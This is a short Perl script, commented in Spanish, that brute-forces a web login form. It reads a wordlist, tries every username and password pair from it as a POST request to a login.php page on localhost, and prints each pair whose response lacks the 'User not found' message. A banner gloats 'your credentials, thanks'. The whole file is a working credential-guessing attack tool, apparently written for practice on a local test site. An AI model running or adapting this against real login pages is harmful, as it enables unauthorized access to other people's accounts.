use LWP::UserAgent;
use strict;



#if ($#ARGV < 0) {
	#QUIERO AYUDA
#	print "Nesecito un arg para hacer el estropicio\n";
#	exit();
#}

my $url = "http://localhost/dbAccess/login.php"; 
open (FILE,"abc.txt") || die "Imposible abrir el diccionario: $!";

#Diccionario a RAM
my @abc = <FILE> ;

#LWP --> Instancio la librería;
my $ua = new LWP::UserAgent;


#AQUÍ VIENE LA CHICHA!!!!
my $req = new HTTP::Request 'POST',$url;

print "\n\n\n";
print "            __^__                              __^__\n";
print "           ( ___ )----------------------------( ___ )\n";
print "            |   |                              |   |\n";
print "            |   | SUS CR3D3NCIAL3S, GR4CI4S... |   |\n";
print "            |___|                              |___|\n";
print "           (_____)----------------------------(_____)\n\n";

foreach(@abc) {
	
	my $user = $_ ;
	
	chomp($user) ;


	foreach(@abc) {
		
		my $pass = $_ ;
		
		chomp($pass) ;
		
		#Construimos las cabeceras

		$req->content_type('application/x-www-form-urlencoded');

		#Fijamos login / pass 

		$req->content("usuario=$user&password=$pass");

		#realizo la petición;
		
		my $res = $ua->request($req);
		
		#respuesta del servidor => Acumulo en variable;
		
		my $result = $res->as_string;
		if($result !~ /<li>User not found<\/li>/) {		
			print "USER: $user\nPASSWORD: $pass\n\n" ;		
		}
	}
}